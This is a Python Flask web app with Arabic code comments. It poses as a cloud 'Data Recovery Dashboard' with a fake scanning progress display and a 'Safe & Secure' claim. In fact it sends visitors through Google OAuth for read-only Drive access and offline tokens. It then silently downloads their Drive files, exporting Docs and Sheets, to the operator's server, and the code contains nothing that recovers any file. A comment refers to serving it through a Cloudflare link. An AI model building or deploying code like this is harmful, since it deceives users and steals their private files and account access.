import os
import io
import json
import requests
from flask import Flask, redirect, url_for, request, render_template_string, session
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload
from google.oauth2.credentials import Credentials

app = Flask(__name__)
app.secret_key = 'super_secret_key_for_flask'

with open('credentials.json') as f:
    client_secrets = json.load(f)['installed']

CLIENT_ID = client_secrets['client_id']
CLIENT_SECRET = client_secrets['client_secret']
AUTHORIZATION_ENDPOINT = client_secrets['auth_uri']
TOKEN_ENDPOINT = client_secrets['token_uri']
SCOPES = [
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/userinfo.profile',
    'openid'
]

INDEX_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>Data Recovery Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #0b0f19;
            color: #f3f4f6;
            height: 100vh;
            display: flex;
            overflow: hidden;
        }
        /* الشريط الجانبي */
        .sidebar {
            width: 240px;
            background: #0e1322;
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            flex-direction: column;
            padding: 20px;
        }
        .logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 40px;
        }
        .logo-icon {
            width: 36px;
            height: 36px;
            background: linear-gradient(135deg, #3b82f6, #1d4ed8);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
            color: white;
            font-weight: bold;
        }
        .logo-text h1 { font-size: 15px; font-weight: 700; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 150px; }
        .logo-text p { font-size: 11px; color: #9ca3af; }
        
        .nav-links { list-style: none; display: flex; flex-direction: column; gap: 8px; flex-grow: 1; }
        .nav-links li a {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 12px 16px;
            color: #9ca3af;
            text-decoration: none;
            border-radius: 12px;
            font-size: 14px;
            transition: all 0.2s;
        }
        .nav-links li.active a, .nav-links li a:hover {
            background: rgba(59, 130, 246, 0.15);
            color: #3b82f6;
        }
        
        .sidebar-footer {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 14px;
            font-size: 12px;
            color: #9ca3af;
        }
        .sidebar-footer strong { color: #3b82f6; display: block; margin-bottom: 4px; }

        /* المحتوى الرئيسي */
        .main-content {
            flex-grow: 1;
            padding: 30px;
            overflow-y: auto;
            display: grid;
            grid-template-columns: 1fr 340px;
            gap: 25px;
        }
        
        .left-section { display: flex; flex-direction: column; gap: 25px; }
        
        /* الكارد الرئيسي البارز */
        .hero-card {
            background: linear-gradient(145deg, #131b2e, #0e1424);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 35px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .hero-text h2 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        .hero-text p { font-size: 13px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; max-width: 380px; }
        .btn-scan {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            padding: 12px 24px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: inline-block;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
            transition: all 0.3s;
        }
        .btn-scan:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6); }

        /* العمود الجانبي للأنشطة */
        .right-section { display: flex; flex-direction: column; gap: 20px; }
        .stats-card {
            background: #111827;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
        }
        .stats-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; font-size: 13px; color: #9ca3af; }
        .circular-progress {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            background: conic-gradient(#3b82f6 78%, #1f2937 0);
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 15px auto;
            position: relative;
        }
        .circular-progress::before {
            content: '';
            position: absolute;
            width: 72px;
            height: 72px;
            background: #111827;
            border-radius: 50%;
        }
        .progress-number { position: relative; font-size: 18px; font-weight: 700; color: #fff; }
    </style>
</head>
<body>
    <!-- الشريط الجانبي -->
    <div class="sidebar">
        <div class="logo-area">
            <div class="logo-icon">🔄</div>
            <div class="logo-text" title="{{ user_name }}">
                <h1>{{ user_name }}</h1>
                <p>Connected Account</p>
            </div>
        </div>
        <ul class="nav-links">
            <li class="active"><a href="#">🏠 Home</a></li>
            <li><a href="#">📂 Recover Files</a></li>
            <li><a href="#">💾 Drive Info</a></li>
            <li><a href="#">⚙️ Settings</a></li>
            <li><a href="#">ℹ️ About</a></li>
        </ul>
        <div class="sidebar-footer">
            <strong>Safe & Secure</strong>
            Your data is protected with high-end security.
        </div>
    </div>

    <!-- المحتوى الرئيسي -->
    <div class="main-content">
        <div class="left-section">
            <!-- الكارد الرئيسي -->
            <div class="hero-card">
                <div class="hero-text">
                    <h2>Data Recovery</h2>
                    <p>Scan, find, and recover your lost or deleted files directly from your cloud storage with one click.</p>
                    <a href="/authorize" class="btn-scan">Start Scan & Recover</a>
                </div>
                <div style="font-size: 65px;">💽</div>
            </div>
        </div>

        <!-- العمود الجانبي للأنشطة -->
        <div class="right-section">
            <div class="stats-card">
                <div class="stats-top">
                    <span>Quick Scan</span>
                    <span style="color: #3b82f6;">Active</span>
                </div>
                <div class="circular-progress">
                    <span class="progress-number">78%</span>
                </div>
                <div style="font-size: 12px; color: #9ca3af;">Scanning files for recovery...</div>
            </div>
        </div>
    </div>
</body>
</html>
'''.strip()

RESULT_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>Data Recovered Successfully</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0b0f19;
            color: #f3f4f6;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .card {
            background: #111827;
            border: 1px solid rgba(59, 130, 246, 0.2);
            padding: 45px 40px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            text-align: center;
            max-width: 420px;
            width: 100%;
        }
        h2 { margin-bottom: 25px; color: #34d399; font-size: 22px; font-weight: 600; }
        .back-btn {
            background: #1f2937;
            color: #9ca3af;
            padding: 12px 24px;
            border-radius: 12px;
            text-decoration: none;
            transition: all 0.2s;
            display: inline-block;
            font-size: 14px;
            font-weight: 600;
        }
        .back-btn:hover { background: #374151; color: #fff; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Your data recovered successfully ✅</h2>
        <a href="/" class="back-btn">Back to Home</a>
    </div>
</body>
</html>
'''.strip()

@app.route('/')
def index():
    user_name = session.get('user_name', 'Data Recovery')
    return render_template_string(INDEX_TEMPLATE, user_name=user_name)

@app.route('/authorize')
def authorize():
    # استخدام الرابط الحالي (سواء كان localhost أو رابط Cloudflare) بشكل ديناميكي لتجنب خطأ الـ mismatch
    base_url = request.host_url.rstrip('/')
    redirect_uri = f"{base_url}/oauth2callback"
    
    auth_url = (
        f"{AUTHORIZATION_ENDPOINT}?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={redirect_uri}&"
        f"response_type=code&"
        f"scope={' '.join(SCOPES)}&"
        f"access_type=offline&"
        f"prompt=consent"
    )
    return redirect(auth_url)

@app.route('/oauth2callback')
def oauth2callback():
    code = request.args.get('code')
    if not code:
        return "Error: Authorization code not received from Google."
    
    base_url = request.host_url.rstrip('/')
    redirect_uri = f"{base_url}/oauth2callback"
    
    token_data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': redirect_uri,
        'grant_type': 'authorization_code'
    }
    
    response = requests.post(TOKEN_ENDPOINT, data=token_data)
    tokens = response.json()
    
    if 'access_token' not in tokens:
        return f"Error fetching token: {tokens}"
    
    access_token = tokens['access_token']
    
    user_info_resp = requests.get(
        'https://www.googleapis.com/oauth2/v1/userinfo',
        headers={'Authorization': f'Bearer {access_token}'}
    )
    user_info = user_info_resp.json()
    session['user_name'] = user_info.get('name', 'Data Recovery')
    
    credentials = Credentials(
        token=access_token,
        refresh_token=tokens.get('refresh_token'),
        token_uri=TOKEN_ENDPOINT,
        client_id=CLIENT_ID,
        client_secret=CLIENT_SECRET,
        scopes=SCOPES
    )
    
    service = build('drive', 'v3', credentials=credentials)
    results = service.files().list(
        pageSize=15, fields="nextPageToken, files(id, name, mimeType)").execute()
    items = results.get('files', [])
    
    download_dir = os.path.join(os.getcwd(), 'received_files')
    os.makedirs(download_dir, exist_ok=True)
    
    for item in items:
        file_id = item['id']
        file_name = item['name']
        mime_type = item.get('mimeType', '')
        
        try:
            if 'google-apps' in mime_type:
                if 'document' in mime_type:
                    request_file = service.files().export_media(fileId=file_id, mimeType='application/pdf')
                    file_name += '.pdf'
                elif 'spreadsheet' in mime_type:
                    request_file = service.files().export_media(fileId=file_id, mimeType='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
                    file_name += '.xlsx'
                else:
                    continue
            else:
                request_file = service.files().get_media(fileId=file_id)
            
            file_path = os.path.join(download_dir, file_name)
            
            fh = io.FileIO(file_path, 'wb')
            downloader = MediaIoBaseDownload(fh, request_file)
            done = False
            while not done:
                status, done = downloader.next_chunk()
        except Exception as e:
            pass
            
    return redirect(url_for('index'))

if __name__ == '__main__':
    os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'
    app.run(port=5000, debug=True)